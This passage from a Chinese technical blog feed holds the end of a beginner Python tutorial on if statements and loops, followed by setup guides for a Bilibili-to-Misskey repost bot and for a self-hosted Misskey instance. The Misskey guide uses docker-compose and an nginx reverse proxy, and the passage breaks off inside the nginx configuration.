&#x27;)</span><br><span class="line">if birth &lt; 2000:</span><br><span class="line">    print(&#x27;00前&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;00后&#x27;)</span><br></pre></td></tr></table></figure><p>输入<code>1982</code>，结果报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: unorderable types: str() &gt; int()</span><br></pre></td></tr></table></figure><p>这是因为<code>input()</code>返回的数据类型是<code>str</code>，<code>str</code>不能直接和整数比较，必须先把<code>str</code>转换成整数。Python 提供了<code>int()</code>函数来完成这件事情：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = input(&#x27;birth: &#x27;)</span><br><span class="line">birth = int(s)</span><br><span class="line">if birth &lt; 2000:</span><br><span class="line">    print(&#x27;00前&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;00后&#x27;)</span><br></pre></td></tr></table></figure><p>再次运行，就可以得到正确地结果。但是，如果输入<code>abc</code>呢？又会得到一个错误信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">ValueError: invalid literal for int() with base 10: &#x27;abc&#x27;</span><br></pre></td></tr></table></figure><p>原来<code>int()</code>函数发现一个字符串并不是合法的数字时就会报错，程序就退出了。</p><p>如何检查并捕获程序运行期的错误呢？后面的错误和调试会讲到。</p><blockquote><p>✏️ 练习题：</p></blockquote><p>小明身高 1.75，体重 80.5kg。请根据 BMI 公式（体重除以身高的平方）帮小明计算他的 BMI 指数，并根据 BMI 指数：</p><ul><li>低于 18.5 ：过轻</li><li>18.5-25 ：正常</li><li>25-28 ：过重</li><li>28-32 ：肥胖</li><li>高于 32 ：严重肥胖</li></ul><p>用<code>if-elif</code>判断并打印结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">height = 1.75</span><br><span class="line">weight = 80.5</span><br><span class="line">bmi = weight / (height * height)</span><br><span class="line">if bmi &gt;= 32:</span><br><span class="line">    print(&#x27;严重肥胖&#x27;)</span><br><span class="line">elif bmi &lt; 32 and bmi &gt;= 28:</span><br><span class="line">    print(&#x27;肥胖&#x27;)</span><br><span class="line">elif bmi &lt; 28 and bmi &gt;= 25:</span><br><span class="line">    print(&#x27;过重&#x27;)</span><br><span class="line">elif bmi &lt; 25 and bmi &gt;= 18.5:</span><br><span class="line">    print(&#x27;正常&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;过轻&#x27;)</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><h3 id="1-3-6-循环"><a href="#1-3-6-循环" class="headerlink" title="1.3.6 循环"></a>1.3.6 循环</h3><p>要计算 1+2+3，我们可以直接写表达式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(1 + 2 + 3) # 6</span><br></pre></td></tr></table></figure><p>要计算 1+2+3+…+10，勉强也能写出来。</p><p>但是，要计算 1+2+3+…+10000，直接写表达式就不可能了。</p><p>为了让计算机能计算成千上万次的重复运算，我们就需要循环语句。</p><h4 id="①-for-…-in"><a href="#①-for-…-in" class="headerlink" title="① for … in"></a>① for … in</h4><p>Python 的循环有两种，一种是 <code>for...in</code> 循环，依次把 list 或 tuple 中的每个元素迭代出来，看例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [&#x27;Michael&#x27;, &#x27;Bob&#x27;, &#x27;Tracy&#x27;]</span><br><span class="line">for name in names:</span><br><span class="line">    print(name)</span><br></pre></td></tr></table></figure><p>执行这段代码，会依次打印<code>names</code>的每一个元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Michael</span><br><span class="line">Bob</span><br><span class="line">Tracy</span><br></pre></td></tr></table></figure><p>所以<code>for x in ...</code>循环就是把每个元素代入变量<code>x</code>，然后执行缩进块的语句。</p><p>再比如我们想计算 1-10 的整数之和，可以用一个<code>sum</code>变量做累加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sum = 0</span><br><span class="line">for x in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:</span><br><span class="line">    sum = sum + x</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure><p>如果要计算 1-100 的整数之和，从 1 写到 100 有点困难，幸好 Python 提供一个<code>range()</code>函数，可以生成一个整数序列，再通过<code>list()</code>函数可以转换为 list。比如<code>range(5)</code>生成的序列是从 0 开始小于 5 的整数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = list(range(5))</span><br><span class="line">print(a) # [0, 1, 2, 3, 4]</span><br></pre></td></tr></table></figure><p><code>range(101)</code>就可以生成 0-100 的整数序列，计算如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sum = 0</span><br><span class="line">for x in range(101):</span><br><span class="line">    sum = sum + x</span><br><span class="line">print(sum) # 5050</span><br></pre></td></tr></table></figure><h4 id="②-while-循环"><a href="#②-while-循环" class="headerlink" title="② while 循环"></a>② while 循环</h4><p>第二种循环是 while 循环，只要条件满足，就不断循环，条件不满足时退出循环。</p><p>比如我们要计算 100 以内所有奇数之和，可以用 while 循环实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum = 0</span><br><span class="line">n = 99</span><br><span class="line">while n &gt; 0:</span><br><span class="line">    sum = sum + n</span><br><span class="line">    n = n - 2</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure><p>在循环内部变量<code>n</code>不断自减，直到变为<code>-1</code>时，不再满足 while 条件，循环退出。</p><blockquote><p>✏️ 练习题：</p></blockquote><p>请利用循环依次对 list 中的每个名字打印出<code>Hello, xxx!</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L = [&#x27;Bart&#x27;, &#x27;Lisa&#x27;, &#x27;Adam&#x27;]</span><br><span class="line">for item in L:</span><br><span class="line">    print(&#x27;Hello, &#x27;+item)</span><br></pre></td></tr></table></figure><h4 id="③-break"><a href="#③-break" class="headerlink" title="③ break"></a>③ break</h4><p>在循环中，<code>break</code>语句可以提前退出循环。例如，本来要循环打印 1～100 的数字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n = 1</span><br><span class="line">while n &lt;= 100:</span><br><span class="line">    print(n)</span><br><span class="line">    n = n + 1</span><br><span class="line">print(&#x27;END&#x27;)</span><br></pre></td></tr></table></figure><p>上面的代码可以打印出 1~100。</p><p>如果要提前结束循环，可以用<code>break</code>语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = 1</span><br><span class="line">while n &lt;= 100:</span><br><span class="line">    if n &gt; 10: # 当n = 11时，条件满足，执行break语句</span><br><span class="line">        break # break语句会结束当前循环</span><br><span class="line">    print(n)</span><br><span class="line">    n = n + 1</span><br><span class="line">print(&#x27;END&#x27;)</span><br></pre></td></tr></table></figure><p>执行上面的代码可以看到，打印出 1~10 后，紧接着打印<code>END</code>，程序结束。</p><p>可见<code>break</code>的作用是提前结束循环。</p><h4 id="④-continue"><a href="#④-continue" class="headerlink" title="④ continue"></a>④ continue</h4><p>在循环过程中，也可以通过<code>continue</code>语句，跳过当前的这次循环，直接开始下一次循环。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n = 0</span><br><span class="line">while n &lt; 10:</span><br><span class="line">    n = n + 1</span><br><span class="line">    print(n)</span><br></pre></td></tr></table></figure><p>上面的程序可以打印出 1～10。但是，如果我们想只打印奇数，可以用<code>continue</code>语句跳过某些循环：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n = 0</span><br><span class="line">while n &lt; 10:</span><br><span class="line">    n = n + 1</span><br><span class="line">    if n % 2 == 0: # 如果n是偶数，执行continue语句</span><br><span class="line">        continue # continue语句会直接继续下一轮循环，后续的print()语句不会执行</span><br><span class="line">    print(n)</span><br></pre></td></tr></table></figure><p>执行上面的代码可以看到，打印的不再是 1～10，而是 1，3，5，7，9。</p><p>可见<code>continue</code>的作用是提前结束本轮循环，并直接开始下一轮循环。</p><blockquote><p>✏️ 总结：</p></blockquote><p>循环是让计算机做重复任务的有效的方法。</p><p><code>break</code>语句可以在循环过程中直接退出循环，而<code>continue</code>语句可以提前结束本轮循环，并直接开始下一轮循环。这两个语句通常都必须配合<code>if</code>语句使用。</p><p>要特别注意，不要滥用<code>break</code>和<code>continue</code>语句。<code>break</code>和<code>continue</code>会造成代码执行逻辑分叉过多，容易出错。大多数循环并不需要用到<code>break</code>和<code>continue</code>语句，上面的两个例子，都可以通过改写循环条件或者修改循环逻辑，去掉<code>break</code>和<code>continue</code>语句。</p><p>有些时候，如果代码写得有问题，会让程序陷入“死循环”，也就是永远循环下去。这时可以用<code>Ctrl+C</code>退出程序，或者强制结束 Python 进程。</p><h2 id="1-4-参考资料"><a href="#1-4-参考资料" class="headerlink" title="1.4 参考资料"></a>1.4 参考资料</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017063413904832">廖雪峰 - Python 3.x - Python 基础</a></li><li><a href="https://www.icourse163.org/learn/BIT-268001?tid=1460270441#/learn/content">Python 语言程序设计 - 北京理工大学</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> python </tag>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建一个用于搬运B站动态的Misskey机器人</title>
      <link href="/89.html"/>
      <url>/89.html</url>
      
        <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://github.com/ybw2016v/bilibili2notes">源码地址</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ybw2016v/bilibili2notes.git</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>源码文件如下</p><p><img src="https://cos.gjcloak.xyz/pigo/202206281643582.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20220628164309378" title="image-20220628164309378"></p><p>进入 <code>conf</code> 文件夹，里面只有一个文件，这个就是关键的配置文件了，example是可以替换成其他名字，可以用你机器人名字来代替，<code>conf</code>目录下可放置多个不同的配置文件，每个文件配置一个机器人</p><p><img src="https://cos.gjcloak.xyz/pigo/202206281644895.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20220628164412757" title="image-20220628164412757"></p><p>配置文件说明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[dog]</span><br><span class="line">;机器人名称</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PostUrl=https://example.com/</span><br><span class="line">;Misskey实例url</span><br><span class="line"></span><br><span class="line">Uid=167446465</span><br><span class="line">;b站uid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ApiKey=Your ApiKey</span><br><span class="line">;misskey机器人的apikey(即Access Tokens)</span><br><span class="line"></span><br><span class="line">Pex=</span><br><span class="line">;Pex=机器人转发</span><br><span class="line">;机器人发布前缀，无特殊需求留空</span><br><span class="line"></span><br><span class="line">Afr=</span><br><span class="line">;Afr=本条消息由机器人转发</span><br><span class="line">;机器人发布后缀，无特殊需求留空</span><br><span class="line"></span><br><span class="line">Extime=1209600</span><br><span class="line">;设置图片的过期时间，超过1209600秒之后的过期图片将会被删除，以节约存储空间，如不清除历史图片，可设置为-1</span><br></pre></td></tr></table></figure><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>在宝塔的计划任务处，新增Shell脚本，时间可以看你自己需要，我是设置了每小时30分的时候执行，脚本内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd [your bot path]</span><br><span class="line">python3 bili2notes.py</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/pigo/202206281648558.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20220628164844515" title="image-20220628164844515"></p><p>这样就完成了，机器人部署，可以愉快地开始玩耍吧！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misskey </tag>
            
            <tag> bot </tag>
            
            <tag> B站 </tag>
            
            <tag> 机器人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misskey 部署搭建笔记</title>
      <link href="/90.html"/>
      <url>/90.html</url>
      
        <content type="html"><![CDATA[<p>Misskey 是一个去中心化的平台，其官方实例为 <a href="https://misskey.io/">misskey.io</a> ，本站实例为 <a href="https://ap.gjclaok.top/">理想城</a> (名字起源于Arcology Project 理想城计划)。</p><blockquote><p>Misskey 只是服务器所有者创建自己的 Misskey 实例的平台，他们都可以互相交谈！有针对大众的大型实例，针对团体、粉丝和亚文化的小型实例，甚至仅针对个人及其朋友的实例。想要拥有更多控制权？您可以相对轻松地在服务器上创建自己的实例，从而与任何想要监视您并出售您的数据的大公司断绝关系。Misskey 是关于社区和分享的，而不是公司和大型科技公司。有朋友不在 Misskey 上吗？没问题！由于 Misskey 在 Fediverse (ActivityPub) 上，您可以在 Mastodon、PixelFed、PeerTube 等其他平台上与人互动！</p></blockquote><p>本文主要使用的是官网的方法进行搭建：</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内存 ≥2G 的 Linux 服务器（至少要 2G 内存，不然到时候就完犊子了）</span><br><span class="line">一个域名，必须要 SSL (https)，可以是自己申请的，也可以是使用宝塔来获得。</span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本文选用 <code>Depian</code> 作为服务器操作系统，为了方便操作，使用的是宝塔面板辅助进行搭建</p><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install curl git -y</span><br></pre></td></tr></table></figure><h3 id="安装-Nginx-和-docker"><a href="#安装-Nginx-和-docker" class="headerlink" title="安装 Nginx 和 docker"></a>安装 Nginx 和 docker</h3><p>在宝塔面板的【软件商店】可以找到 Nginx 和 Docker 管理器进行安装，这里不赘述。</p><h3 id="安装-docker-compose"><a href="#安装-docker-compose" class="headerlink" title="安装 docker-compose"></a>安装 docker-compose</h3><p>打开宝塔面板的【SSH 终端】复制下方命令安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L &quot;https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line">ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><p>当然也可以去<a href="https://docs.docker.com/compose/install/">官网</a> 查看最新版的安装方法</p><h2 id="安装-Misskey"><a href="#安装-Misskey" class="headerlink" title="安装 Misskey"></a>安装 Misskey</h2><h3 id="获取仓库源码"><a href="#获取仓库源码" class="headerlink" title="获取仓库源码"></a>获取仓库源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/misskey-dev/misskey.git</span><br><span class="line">cd misskey</span><br><span class="line">git checkout master</span><br></pre></td></tr></table></figure><h3 id="复制配置文件"><a href="#复制配置文件" class="headerlink" title="复制配置文件"></a>复制配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp .config/example.yml .config/default.yml</span><br><span class="line">cp .config/docker_example.env .config/docker.env</span><br></pre></td></tr></table></figure><p>根据文件中的说明进行 <code>default.yml</code> 和 <code>docker.env</code> 的配置</p><p><code>default.yml</code>源文件精简后内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 修改成你的网站网址，一旦启用misskey，请勿更改</span><br><span class="line">url: https://example.tld/ </span><br><span class="line">port: 3000</span><br><span class="line"></span><br><span class="line">db:</span><br><span class="line">  host: db # 在docker环境下，此处应为db</span><br><span class="line">  port: 5432</span><br><span class="line">  db: misskey</span><br><span class="line"></span><br><span class="line"># 数据库用户名和密码(需要修改)</span><br><span class="line">  user: example-misskey-user  #如果你是用root用户来执行搭建，这必选填写成root</span><br><span class="line">  pass: example-misskey-pass</span><br><span class="line"></span><br><span class="line">redis:</span><br><span class="line">  host: redis # 在docker环境下，此处应为redis</span><br><span class="line">  port: 6379</span><br><span class="line">  </span><br><span class="line">id: &#x27;aid&#x27;</span><br></pre></td></tr></table></figure><p><code>docker.env</code> 文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POSTGRES_PASSWORD=example-misskey-pass</span><br><span class="line">POSTGRES_USER=example-misskey-user</span><br><span class="line">POSTGRES_DB=misskey</span><br></pre></td></tr></table></figure><p>修改 <code>example-misskey-pass</code> 为你 <code>default.yml</code> 中的数据库密码</p><p>修改 <code>example-misskey-user</code> 为你 <code>default.yml</code> 中的数据库用户名。</p><p><code>docker-compose.yml</code> 如无特殊需求可以不需要改动，确保与站点的配置一致:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;3&quot;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    restart: always # 自动重启，请注意如果您对您的配置没有信心，请不要开启这个选项(把这一行注释即可)，以避免进程崩溃反复重启耗费大量资源！</span><br><span class="line">    image: misskey/misskey:latest # 我们使用misskey提供的官方镜像</span><br><span class="line">    container_name: misskey_web # 容器名，就是个名字，方便辨认</span><br><span class="line">    links:</span><br><span class="line">      - db</span><br><span class="line">      - redis</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;127.0.0.1:3000:3000&quot;  #默认映射到3000端口上</span><br><span class="line">    networks:</span><br><span class="line">      - internal_network</span><br><span class="line">      - external_network</span><br><span class="line">    volumes:</span><br><span class="line">      - ./config:/misskey/.config:ro # 用于映射配置文件，请根据您的实际配置来决定文件夹名称，设定为只读即可</span><br><span class="line">      - ./files:/misskey/files # 用户上传到本地的文件，如果您一开始就接入外部存储（如wasabi或是AWS S3）您可以忽略这块配置</span><br><span class="line"></span><br><span class="line">  redis:</span><br><span class="line">    restart: always</span><br><span class="line">    image: redis:latest</span><br><span class="line">    container_name: misskey_redis</span><br><span class="line">    networks:</span><br><span class="line">      - internal_network</span><br><span class="line">    volumes:</span><br><span class="line">      - ./redis:/data # redis数据库的数据文件夹映射，创建后默认在 ./redis 文件夹中</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    restart: always</span><br><span class="line">    image: postgres:12.2-alpine</span><br><span class="line">    container_name: misskey_db</span><br><span class="line">    networks:</span><br><span class="line">      - internal_network</span><br><span class="line">    env_file:</span><br><span class="line">      - ./config/docker.env # 需要使用配置文件中设置的 Docker 环境变量</span><br><span class="line">    volumes:</span><br><span class="line">      - ./db:/var/lib/postgresql/data # 主数据库的数据文件夹映射，创建后默认在 ./db 文件夹中</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  internal_network: # 内部网络</span><br><span class="line">    internal: true</span><br><span class="line">  external_network: # 外部网络</span><br></pre></td></tr></table></figure><h3 id="构建和初始化"><a href="#构建和初始化" class="headerlink" title="构建和初始化"></a>构建和初始化</h3><p>执行以下命令等待完成 Misskey 的构建 并初始化数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose run --rm web yarn run init</span><br></pre></td></tr></table></figure><p>完成初始化数据库后，继续输入如下命令启动容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="反代配置"><a href="#反代配置" class="headerlink" title="反代配置"></a>反代配置</h2><p>打开宝塔的【网站】找到对应网站的 Nginx 配置文件进行配置</p><p><img src="https://cos.gjcloak.xyz/pigo/202206281140915.webp?imageMogr2/format/webp/interlace/1/quality/80" alt="Nginx 反代理配置" title="Nginx 反代理配置"></p><p>配置示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"># For WebSocket</span><br><span class="line">map $http_upgrade $connection_upgrade &#123;</span><br><span class="line">    default upgrade;</span><br><span class="line">    &#x27;&#x27;      close;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxy_cache_path /tmp/nginx_cache levels=1:2 keys_zone=cache1:16m max_size=1g inactive=720m use_temp_path=off;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    server_name example.tld;</span><br><span class="line"></span><br><span class="line">    # For SSL domain validation</span><br><span class="line">    root /var/www/html;</span><br><span class="line">    location /.well-known/acme-challenge/ &#123; allow all; &#125;</span><br><span class="line">    location /.well-known/pki-validation/ &#123; allow all; &#125;</span><br><span class="line">    location / &#123; return 301 https://$server_name$request_uri; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl http2;</span><br><span class="line">    listen [::]:443 ssl http2;</span><br><span class="line">    server_name example.tld;</span><br><span class="line"></span><br><span class="line">    ssl_session_timeout 1d;</span><br><span class="line">    ssl_session_cache shared:ssl_session_cache:10m;</span><br><span class="line">    ssl_session_tickets off;</span><br><span class="line"></span><br><span class="line">    # To use Let&#x27;s Encrypt certificate</span><br><span class="line">    ssl_certificate     /etc/letsencrypt/live/example.tld/fullchain.pem;</span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/example.tld/privkey.pem;</span><br><span class="line"></span><br><span class="line">    # To use Debian/Ubuntu&#x27;s self-signed certificate (For testing or before issuing a certificate)</span><br><span class="line">    #ssl_certificate     /etc/ssl/certs/ssl-cert-snakeoil.pem;</span><br><span class="line">    #ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;</span><br><span class="line"></span><br><span class="line">    # SSL protocol settings</span><br><span class="line">    ssl_protocols TLSv1.2 TLSv1.3;</span><br><span class="line">    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;</span><br><span class="line">    ssl_prefer_server_ciphers off;</span><br><span class="line">    ssl_stapling on;</span><br><span class="line">    ssl_stapling_verify on;</span><br><span class="line"></span><br><span class="line">    # Change to your upload limit</span><br><span class="line">    client_max_body_size 80m;</span><br><span class="line"></span><br><span class="line">    # Proxy to Node</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:3000;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_redirect off;</span><br><span class="line"></span><br><span class="line">        # If it&#x27;s behind another reverse proxy or CDN, remove the following.</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        